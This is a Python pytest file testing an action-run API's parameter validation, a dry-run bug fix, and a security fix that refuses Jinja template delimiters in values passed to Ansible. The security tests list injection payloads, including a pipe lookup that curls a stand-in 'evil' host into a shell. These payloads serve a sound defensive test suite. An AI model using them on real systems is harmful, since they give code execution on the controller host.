"""Tests for the parameter-validation gate on POST /api/actions/runs.

Covers C3 scope: missing-required, type-mismatch, unknown-key all
return 422 with a structured error body. Built-in actions are rejected
with 400 from the C2 guard until C5 wires per-host dispatch.

Uses ``conftest.create_host`` and the ``superuser_client`` fixture; no
Celery dispatch is exercised — the API layer's validation runs before
the task is sent.
"""

from __future__ import annotations

from unittest.mock import patch

import pytest

from tests.conftest import create_host

pytestmark = pytest.mark.integration


@pytest.fixture
def stub_celery_dispatch():
    """Block any Celery send_task during these tests."""
    with (
        patch("app.api.actions.celery_app", create=True),
        patch("celery.app.base.Celery.send_task"),
    ):
        yield


async def test_unknown_action_returns_400(superuser_client, db, stub_celery_dispatch):
    host = await create_host(db)
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={"action_key": "no-such-action", "host_id": host.id},
    )
    assert resp.status_code == 400
    assert "Unknown action" in resp.text


async def test_builtin_action_dispatches_via_runs_endpoint(
    superuser_client, db, stub_celery_dispatch
):
    """C5 wired built-in dispatch — /api/actions/runs is now universal."""
    host = await create_host(db)
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={"action_key": "_builtin.collect_state", "host_id": host.id},
    )
    assert resp.status_code == 201, resp.text
    body = resp.json()
    assert body["action_key"] == "_builtin.collect_state"
    assert body["status"] == "queued"


async def test_missing_required_parameter_returns_422(superuser_client, db, stub_celery_dispatch):
    """linux-os-upgrade requires current_version and next_version."""
    host = await create_host(db)
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={
            "action_key": "linux-os-upgrade",
            "host_id": host.id,
            "parameters": {},  # missing both
        },
    )
    assert resp.status_code == 422
    body = resp.json()
    # Pydantic-shaped errors list, not the old "Missing required parameters: …"
    detail = body["detail"]
    assert isinstance(detail, list)
    missing_fields = {tuple(err["loc"]) for err in detail if err["type"] == "missing"}
    assert ("current_version",) in missing_fields
    assert ("next_version",) in missing_fields


async def test_type_mismatched_parameter_returns_422(superuser_client, db, stub_celery_dispatch):
    """linux-os-upgrade.parameters has typed entries — passing the wrong
    type should reject before dispatch, not silently coerce."""
    host = await create_host(db)
    # Action manifest defines current_version + next_version as choice
    # (Literal). Passing an int rejects.
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={
            "action_key": "linux-os-upgrade",
            "host_id": host.id,
            "parameters": {"current_version": 99, "next_version": "trixie"},
        },
    )
    assert resp.status_code == 422


async def test_unknown_parameter_key_returns_422(superuser_client, db, stub_celery_dispatch):
    """``extra='forbid'`` on the dynamic param model → unknown keys 422."""
    host = await create_host(db)
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={
            "action_key": "linux-upgrade",
            "host_id": host.id,
            "parameters": {"there_is_no_such_key": True},
        },
    )
    assert resp.status_code == 422


async def test_supports_fleet_exposed_in_actions_listing(superuser_client, db):
    resp = await superuser_client.get("/api/actions/")
    assert resp.status_code == 200
    rows = {r["key"]: r for r in resp.json()}
    # Built-ins are in the listing with the right supports_fleet.
    assert rows["_builtin.drift_check"]["supports_fleet"] is True
    assert rows["_builtin.sync"]["supports_fleet"] is False
    # Pack-supplied actions default to False.
    assert rows["linux-upgrade"]["supports_fleet"] is False


# ---------------------------------------------------------------------------
# BUG-53 — dry run
# ---------------------------------------------------------------------------
#
# The Preview (dry-run) button failed for every action with "Extra inputs
# are not permitted". The dialog put `__dry_run` inside `parameters`, and
# `parameters` is validated against the action's manifest schema with
# `extra="forbid"` — so the flag was rejected before the Celery task that
# pops it ever ran. There was no test on this path at all, which is how it
# shipped.
#
# `_builtin.collect_state` is used deliberately: it declares no parameters,
# so its param model is empty and rejects *any* extra key. That makes it
# both the tightest case and one that does not depend on the bundled pack
# being present.


async def test_a_dry_run_is_accepted(superuser_client, db, stub_celery_dispatch):
    """The regression. This returned 422 before the fix."""
    host = await create_host(db)
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={
            "action_key": "_builtin.collect_state",
            "host_id": host.id,
            "parameters": {},
            "dry_run": True,
        },
    )
    assert resp.status_code == 201, resp.text


async def test_a_dry_run_reaches_the_task(superuser_client, db, stub_celery_dispatch):
    """`dry_run` on the request body has to land in the stored parameters:
    the Celery task is handed `ActionRun.parameters` and nothing else, so
    a flag that stops at the API is a flag the run never sees."""
    host = await create_host(db)
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={
            "action_key": "_builtin.collect_state",
            "host_id": host.id,
            "dry_run": True,
        },
    )
    assert resp.status_code == 201, resp.text
    assert resp.json()["parameters"] == {"__dry_run": True}


async def test_a_normal_run_carries_no_dry_run_flag(superuser_client, db, stub_celery_dispatch):
    host = await create_host(db)
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={"action_key": "_builtin.collect_state", "host_id": host.id},
    )
    assert resp.status_code == 201, resp.text
    assert resp.json()["parameters"] == {}


async def test_a_client_supplied_dry_run_key_is_ignored(superuser_client, db, stub_celery_dispatch):
    """Stripping it is not the same as honouring it. `dry_run` is the
    documented field; a parameter that quietly turned a real run into a
    no-op would be worse than the 422 this replaces."""
    host = await create_host(db)
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={
            "action_key": "_builtin.collect_state",
            "host_id": host.id,
            "parameters": {"__dry_run": True},
            "dry_run": False,
        },
    )
    assert resp.status_code == 201, resp.text
    assert resp.json()["parameters"] == {}


async def test_other_unknown_keys_are_still_rejected(superuser_client, db, stub_celery_dispatch):
    """The strip is one key wide. `extra="forbid"` still catches an
    operator's typo, which is what it is there for."""
    host = await create_host(db)
    resp = await superuser_client.post(
        "/api/actions/runs",
        json={
            "action_key": "_builtin.collect_state",
            "host_id": host.id,
            "parameters": {"__dry_runn": True},
        },
    )
    assert resp.status_code == 422


class TestTemplateDelimitersAreRefused:
    """SEC-20: action parameters become Ansible extra-vars.

    Ansible does not mark extra-vars ``!unsafe``, so the moment a playbook
    templates one — a ``msg:``, a ``when:``, a ``template:`` src — the
    value is evaluated **on the Ansible controller**, which is the LabDog
    host itself, as the labdog user. Not on the target. So
    ``{{ lookup('pipe', 'curl … | sh') }}`` in an ordinary run body was
    code execution on LabDog, reachable by any authenticated account.
    """

    @pytest.mark.parametrize(
        "payload",
        [
            "{{ lookup('pipe', 'id') }}",
            "1.2.3 {{ lookup('pipe','curl http://evil/x | sh') }}",
            "{% for x in range(10) %}{% endfor %}",
            "{# comment #}",
            # Splices into the middle of an existing expression from the
            # other side, so the opening delimiter is in the template.
            "1.2.3 }} evil {{",
        ],
    )
    async def test_jinja_in_a_string_parameter_is_422(
        self, superuser_client, db, stub_celery_dispatch, payload
    ):
        host = await create_host(db)
        resp = await superuser_client.post(
            "/api/actions/runs",
            json={
                "action_key": "linux-os-upgrade",
                "host_id": host.id,
                "parameters": {"current_version": payload, "next_version": "13"},
            },
        )
        assert resp.status_code == 422, resp.text
        assert "template delimiters" in resp.text

    async def test_an_ordinary_version_string_still_runs(
        self, superuser_client, db, stub_celery_dispatch
    ):
        """The regression half — braces are not common in these values, but
        refusing every string would be its own outage."""
        host = await create_host(db)
        resp = await superuser_client.post(
            "/api/actions/runs",
            json={
                "action_key": "linux-os-upgrade",
                "host_id": host.id,
                "parameters": {"current_version": "12", "next_version": "13"},
            },
        )
        assert resp.status_code not in (400, 422), resp.text


class TestExtraVarsAreRecheckedBeforeAnsible:
    """The task-layer gate, which does not trust the API gate.

    Parameters can reach a run without passing ``build_param_model``: a row
    written before this validation existed, a ``choice`` whose permitted
    values come from a pack manifest rather than from LabDog, or a future
    caller assembling a run directly.
    """

    def test_a_clean_payload_passes_through_unchanged(self):
        from app.actions.extra_vars import sanitize_extra_vars

        params = {"version": "13", "reboot": True, "count": 3}
        assert sanitize_extra_vars(params) is params

    def test_none_and_empty_are_allowed(self):
        from app.actions.extra_vars import sanitize_extra_vars

        assert sanitize_extra_vars(None) is None
        assert sanitize_extra_vars({}) == {}

    @pytest.mark.parametrize(
        "params",
        [
            {"v": "{{ lookup('pipe','id') }}"},
            {"outer": {"inner": "{{ 7*7 }}"}},
            {"items": ["ok", "{% import os %}"]},
            {"items": [{"deep": "{{ x }}"}]},
        ],
    )
    def test_template_syntax_anywhere_in_the_structure_raises(self, params):
        from app.actions.extra_vars import sanitize_extra_vars

        with pytest.raises(ValueError, match="template delimiters"):
            sanitize_extra_vars(params)

    def test_the_error_names_the_offending_key_path(self):
        from app.actions.extra_vars import sanitize_extra_vars

        with pytest.raises(ValueError, match=r"outer\.inner"):
            sanitize_extra_vars({"outer": {"inner": "{{ x }}"}})
